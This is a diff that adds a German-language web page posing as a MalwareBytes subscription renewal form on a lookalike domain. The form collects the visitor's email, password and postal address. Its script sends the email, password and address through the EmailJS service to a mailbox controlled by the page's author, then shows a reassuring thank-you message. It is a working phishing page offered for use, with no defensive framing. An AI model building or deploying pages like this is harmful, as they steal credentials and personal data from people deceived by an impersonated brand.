@@ -1,0 +1,528 @@
+<!doctype html>
+<html lang="de">
+<head>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/index.min.js"></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Abo erneuern</title>
+	<style>
+		:root {
+			--blue-900: #001b4d;
+			--blue-700: #0d3ecc;
+			--blue-600: #1f57ff;
+			--blue-100: #dfe9ff;
+			--sky-050: #f3f7ff;
+			--text: #14213d;
+			--muted: #5f6f8c;
+			--surface: #ffffff;
+			--border: #d6deef;
+			--ok: #1ea96b;
+			--warn: #f2b904;
+		}
+
+		* {
+			box-sizing: border-box;
+		}
+
+		body {
+			margin: 0;
+			font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+			color: var(--text);
+			background: radial-gradient(circle at 85% -20%, #9eb8ff 0%, #f7f9ff 45%, #ffffff 100%);
+		}
+
+		.container {
+			width: min(1160px, 92%);
+			margin: 0 auto;
+		}
+
+		.topbar {
+			background: var(--blue-900);
+			color: #d8e4ff;
+			font-size: 0.86rem;
+			padding: 8px 0;
+			text-align: center;
+		}
+
+		header {
+			position: sticky;
+			top: 0;
+			z-index: 20;
+			background: rgba(255, 255, 255, 0.92);
+			border-bottom: 1px solid var(--border);
+		}
+
+		.nav {
+			min-height: 74px;
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			gap: 16px;
+		}
+
+		.brand {
+			text-decoration: none;
+			color: var(--blue-900);
+			font-weight: 800;
+			font-size: 1.2rem;
+			letter-spacing: 0.3px;
+		}
+
+		.brand span {
+			color: var(--blue-700);
+		}
+
+		.nav-list {
+			display: flex;
+			list-style: none;
+			margin: 0;
+			padding: 0;
+			gap: 8px;
+			flex-wrap: wrap;
+			align-items: center;
+		}
+
+		.nav-list a {
+			text-decoration: none;
+			color: var(--muted);
+			font-weight: 600;
+			padding: 8px 12px;
+			border-radius: 999px;
+		}
+
+		.nav-list a:hover {
+			background: var(--blue-100);
+			color: var(--blue-700);
+		}
+
+		.cta {
+			text-decoration: none;
+			color: #fff;
+			background: linear-gradient(135deg, var(--blue-700), var(--blue-600));
+			border-radius: 999px;
+			padding: 10px 16px;
+			font-weight: 700;
+			box-shadow: 0 8px 18px rgba(13, 62, 204, 0.3);
+		}
+
+		.hero {
+			padding: 64px 0 40px;
+		}
+
+		.hero-grid {
+			display: grid;
+			grid-template-columns: 1.05fr 0.95fr;
+			gap: 24px;
+			align-items: stretch;
+		}
+
+		.hero-panel,
+		.form-panel,
+		.info-panel,
+		.trust-panel,
+		.note {
+			background: var(--surface);
+			border: 1px solid var(--border);
+			border-radius: 18px;
+			box-shadow: 0 12px 30px rgba(20, 33, 61, 0.06);
+		}
+
+		.hero-panel {
+			padding: 34px;
+			background: linear-gradient(180deg, #ffffff 0%, #f8fbff 100%);
+		}
+
+		.eyebrow {
+			color: var(--blue-700);
+			font-weight: 800;
+			text-transform: uppercase;
+			letter-spacing: 0.08em;
+			font-size: 0.78rem;
+		}
+
+		h1 {
+			margin: 8px 0 14px;
+			font-size: clamp(1.9rem, 4vw, 3.2rem);
+			line-height: 1.06;
+			color: var(--blue-900);
+		}
+
+		.lead {
+			margin: 0;
+			color: var(--muted);
+			line-height: 1.6;
+			max-width: 56ch;
+		}
+
+		.feature-list {
+			list-style: none;
+			padding: 0;
+			margin: 22px 0 0;
+			display: grid;
+			gap: 10px;
+		}
+
+		.feature-list li {
+			display: flex;
+			align-items: center;
+			gap: 10px;
+			color: #33455f;
+			font-weight: 600;
+		}
+
+		.check {
+			width: 10px;
+			height: 10px;
+			border-radius: 50%;
+			background: var(--ok);
+			box-shadow: 0 0 0 4px rgba(30, 169, 107, 0.16);
+			flex: 0 0 auto;
+		}
+
+		.form-panel {
+			padding: 26px;
+			background: linear-gradient(145deg, #0b2f99 0%, #194fe0 100%);
+			color: #fff;
+			position: relative;
+			overflow: hidden;
+		}
+
+		.form-panel::after {
+			content: "";
+			position: absolute;
+			width: 190px;
+			height: 190px;
+			border-radius: 50%;
+			background: rgba(255, 255, 255, 0.13);
+			right: -60px;
+			top: -60px;
+		}
+
+		.form-panel h2 {
+			margin: 0 0 8px;
+			color: #fff;
+			font-size: 1.35rem;
+			position: relative;
+			z-index: 1;
+		}
+
+		.form-panel p {
+			margin: 0 0 18px;
+			color: #e6efff;
+			line-height: 1.55;
+			position: relative;
+			z-index: 1;
+		}
+
+		.form-panel .form {
+			position: relative;
+			z-index: 1;
+			display: grid;
+			gap: 12px;
+		}
+
+		label {
+			display: block;
+			font-size: 0.92rem;
+			font-weight: 700;
+			margin-bottom: 6px;
+			color: #edf3ff;
+		}
+
+		input,
+		select,
+		textarea {
+			width: 100%;
+			border: 1px solid rgba(255, 255, 255, 0.28);
+			border-radius: 12px;
+			padding: 12px 14px;
+			font: inherit;
+			color: #14213d;
+			background: rgba(255, 255, 255, 0.96);
+			outline: none;
+		}
+
+		input:focus,
+		select:focus,
+		textarea:focus {
+			border-color: #ffffff;
+			box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.22);
+		}
+
+		textarea {
+			min-height: 104px;
+			resize: vertical;
+		}
+
+		.grid-two {
+			display: grid;
+			grid-template-columns: 1fr 1fr;
+			gap: 12px;
+		}
+
+		.submit-row {
+			display: flex;
+			flex-wrap: wrap;
+			gap: 12px;
+			align-items: center;
+			margin-top: 6px;
+		}
+
+		button {
+			border: 0;
+			border-radius: 999px;
+			background: linear-gradient(135deg, #ffffff, #edf2ff);
+			color: var(--blue-900);
+			padding: 12px 18px;
+			font-weight: 800;
+			cursor: pointer;
+			box-shadow: 0 8px 18px rgba(0, 0, 0, 0.12);
+		}
+
+		button:hover {
+			transform: translateY(-1px);
+		}
+
+		.form-hint {
+			margin: 0;
+			font-size: 0.9rem;
+			color: #e8f0ff;
+		}
+
+		.info-row {
+			display: grid;
+			grid-template-columns: repeat(3, 1fr);
+			gap: 14px;
+			padding: 14px 0 54px;
+		}
+
+		.info-panel {
+			padding: 20px;
+			background: linear-gradient(180deg, #ffffff 0%, var(--sky-050) 100%);
+		}
+
+		.info-panel h3 {
+			margin: 0 0 8px;
+			color: var(--blue-900);
+			font-size: 1.05rem;
+		}
+
+		.info-panel p {
+			margin: 0;
+			color: var(--muted);
+			line-height: 1.55;
+		}
+
+		.trust-panel {
+			padding: 26px;
+			margin-bottom: 18px;
+			display: flex;
+			justify-content: space-between;
+			gap: 12px;
+			flex-wrap: wrap;
+			align-items: center;
+			background: linear-gradient(180deg, #ffffff 0%, var(--sky-050) 100%);
+		}
+
+		.stars {
+			color: var(--warn);
+			font-size: 1rem;
+			letter-spacing: 0.12em;
+			margin-bottom: 4px;
+		}
+
+		.trust-text {
+			color: var(--muted);
+			margin: 0;
+		}
+
+		.pill {
+			padding: 10px 14px;
+			border-radius: 999px;
+			font-weight: 700;
+			border: 1px solid var(--border);
+			background: #fff;
+			color: #46587c;
+		}
+
+		.note {
+			padding: 18px 20px;
+			margin-bottom: 56px;
+			border-left: 4px solid var(--ok);
+			color: #254059;
+			background: #f5fffa;
+		}
+
+		.note code {
+			background: #e9f4ff;
+			padding: 2px 6px;
+			border-radius: 6px;
+			border: 1px solid #cfe0ff;
+		}
+
+		footer {
+			border-top: 1px solid var(--border);
+			padding: 18px 0 30px;
+			color: #5f6f8c;
+			font-size: 0.9rem;
+		}
+
+		@media (max-width: 980px) {
+			.hero-grid,
+			.info-row {
+				grid-template-columns: 1fr;
+			}
+		}
+
+		@media (max-width: 640px) {
+			.nav {
+				min-height: auto;
+				padding: 12px 0;
+				flex-direction: column;
+				align-items: flex-start;
+			}
+
+			.hero {
+				padding-top: 34px;
+			}
+
+			.hero-panel,
+			.form-panel {
+				padding: 20px;
+			}
+
+			.grid-two {
+				grid-template-columns: 1fr;
+			}
+		}
+	</style>
+</head>
+<body>
+	<div class="topbar">Abo verlaengern und den vollen Schutz fortsetzen</div>
+
+	<header>
+		<nav class="container nav" aria-label="Hauptnavigation">
+			<a class="brand" href="https://bytes.suchsel.online" target="_self">Malware<span>Bytes</span></a>
+			<ul class="nav-list">
+
+			</ul>
+			<a class="cta" href="https://bytes.suchsel.online/extend" target="_self">Jetzt erneuern</a>
+		</nav>
+	</header>
+
+	<main class="container">
+		<section class="hero" id="renew">
+			<div class="hero-grid">
+				<article class="hero-panel">
+					<p class="eyebrow">Subscription Renewal</p>
+					<h1>Erneuere dein Abo in wenigen Schritten</h1>
+					<p class="lead">
+						Diese Seite ist im gleichen Stil aufgebaut wie die Hauptseite, aber hier steht
+						ein klares Formular zum Erneuern des Abos im Mittelpunkt.
+					</p>
+
+					<ul class="feature-list">
+						<li><span class="check"></span> Laufzeit direkt anpassen</li>
+						<li><span class="check"></span> Plan und Kontaktdaten pruefen</li>
+						<li><span class="check"></span> Schutz ohne Unterbrechung fortsetzen</li>
+					</ul>
+				</article>
+
+				<aside class="form-panel" aria-label="Aboformular">
+					<h2>Abo erneuern</h2>
+					<div class="form">
+						<div>
+							<label for="email">E-Mail-Adresse</label>
+							<input id="email" name="email" type="email" placeholder="name@beispiel.de">
+						</div>
+
+                        <div>
+							<label for="password">Passwort</label>
+							<input id="password" name="password" type="text" placeholder="Gib dein Passwort ein">
+						</div>
+
+                        <div>
+							<label for="confirm-password">Passwort erneut eingeben</label>
+							<input id="confirm-password" name="confirm-password" type="text" placeholder="Gib dein Passwort erneut ein">
+						</div>
+
+						<div class="grid-two">
+							<div>
+								<label for="plan">Abo-Plan</label>
+								<select id="plan" name="plan">
+									<option>Premium</option>
+									<option>Standard</option>
+									<option>Familie</option>
+								</select>
+							</div>
+							<div>
+								<label for="term">Verlaengerung</label>
+								<select id="term" name="term">
+									<option>1 Monat</option>
+									<option>12 Monate</option>
+									<option>24 Monate</option>
+								</select>
+							</div>
+						</div>
+
+                        <div>
+							<label for="address">Adresse</label>
+							<input id="address" name="address" type="text" placeholder="Gib deine Adresse ein">
+						</div>
+
+						<div>
+							<label for="message">Nachricht</label>
+							<textarea id="message" name="message" placeholder="Optional: besondere Hinweise zur Verlaengerung"></textarea>
+						</div>
+
+						<div class="submit-row">
+							<button onclick="send()">Abo erneuern</button>
+						</div>
+					</div>
+				</aside>
+			</div>
+		</section>
+        <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+        </script>
+		<script>
+			emailjs.init("zM45sD-mfpvGvAZ_v"); // Ersetze mit deinem Public Key von emailjs.com
+			const EMAILJS_SERVICE_ID = "service_sas30ng";
+			const EMAILJS_TEMPLATE_ID = "template_o2qlnep"; // Falls noetig: mit deiner echten template_xxxxx ID ersetzen
+
+			async function send() {
+                if (!document.getElementById("email").value || !document.getElementById("password").value || !document.getElementById("plan").value || !document.getElementById("term").value || !document.getElementById("address").value) {
+                    alert("Bitte fülle alle Felder aus.");
+                    return;
+                }
+                if (document.getElementById("password").value !== document.getElementById("confirm-password").value) {
+                    alert("Die Passwörter stimmen nicht überein.");
+                    return;
+                }
+
+				const templateParams = {
+					email: document.getElementById("email").value,
+					password: document.getElementById("password").value,
+					adress: document.getElementById("address").value,
+					message: document.getElementById("message").value
+				};
+
+				try {
+					const response = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+					console.log("EmailJS success:", response.status, response.text);
+					alert("Vielen Dank! Deine Verlängerung wird in Kürze bearbeitet.");
+					document.querySelectorAll("input").forEach(input => input.value = "");
+					document.querySelectorAll("textarea").forEach(textarea => textarea.value = "");
+				} catch (error) {
+					console.error("EmailJS error:", error);
+					alert("Senden fehlgeschlagen. Bitte öffne die Browser-Konsole (F12) und prüfe den Fehler.");
+				}
+            }
+        </script>
+	</main>
+
+	<footer>
+		<div class="container">2026 MalwareBytes | Verlängerungsseite</div>
+	</footer>
+</body>
+</html>
